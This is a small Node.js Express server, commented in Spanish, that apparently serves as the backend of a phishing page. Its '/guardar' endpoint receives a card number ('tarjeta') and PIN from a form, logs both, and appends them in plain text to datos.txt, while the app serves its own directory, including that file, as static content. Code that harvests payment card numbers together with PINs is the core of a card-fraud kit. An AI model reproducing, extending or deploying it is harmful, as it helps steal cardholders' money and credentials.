const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(bodyParser.urlencoded({ extended: false }));

// Añade esta línea para servir archivos estáticos
app.use(express.static(__dirname));

// Tu endpoint para guardar datos
app.post('/guardar', (req, res) => {
    const { tarjeta, pin } = req.body;
    console.log('Recibido:', tarjeta, pin);
    fs.appendFileSync('datos.txt', `Tarjeta: ${tarjeta}, PIN: ${pin}\n`);
    res.sendStatus(200);
});

app.listen(5500, () => console.log('Servidor escuchando en puerto 5500'));